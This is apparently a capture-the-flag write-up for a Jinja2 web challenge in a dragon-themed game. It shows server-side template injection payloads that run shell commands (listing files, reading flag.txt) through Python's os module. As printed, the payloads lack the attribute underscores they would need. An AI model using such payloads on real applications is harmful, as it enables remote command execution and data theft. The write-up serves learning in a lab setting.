## Description:

- As you ascend the treacherous slopes of the Flame Peaks, the scorching heat and shifting volcanic terrain test your endurance with every step. Rivers of molten lava carve fiery paths through the mountains, illuminating the night with an eerie crimson glow. The air is thick with ash, and the distant rumble of the earth warns of the danger that lies ahead. At the heart of this infernal landscape, a colossal Fire Drake awaits—a guardian of flame and fury, determined to judge those who dare trespass. With eyes like embers and scales hardened by centuries of heat, the Fire Drake does not attack blindly. Instead, it weaves illusions of fear, manifesting your deepest doubts and past failures. To reach the Emberstone, the legendary artifact hidden beyond its lair, you must prove your resilience, defying both the drake’s scorching onslaught and the mental trials it conjures. Stand firm, outwit its trickery, and strike with precision—only those with unyielding courage and strategic mastery will endure the Trial by Fire and claim their place among the legends of Eldoria.
## Skills Required

- Knowledge of Python
- Knowledge of Jinja2

## Skills Learned

- Performing Server-Side Template Injection

## Solve
When we visit the site, we're greeted with a form that accepts the "warrior's" name.

![](Images/Pasted%20image%2020250326215735.png)

Then we are greeted with a turn-based game. We can perform attacks and the dragon responds.

![](Images/Pasted%20image%2020250326215740.png)

After the game ends, we have a statistics page showed.

![](Images/Pasted%20image%2020250326215745.png)

## Vulnerability Discovery: SSTI

Upon inspecting the source code of the web application, a significant clue emerged: this was likely a **Server-Side Template Injection (SSTI)** vulnerability.
![](Images/Pasted%20image%2020250326215924.png)

Armed with this information, I conducted research on common SSTI payloads. After testing a few, I discovered that the following payload successfully returned the contents of the current directory:
`{{config.class.init.globals['os'].popen('ls').read()}}`

![](Images/Pasted%20image%2020250326220000.png)

Next we just have to open the respective flag.txt `{{config.class.init.globals['os'].popen('cat flag.txt').read()}}`
![](Images/Pasted%20image%2020250326220038.png)

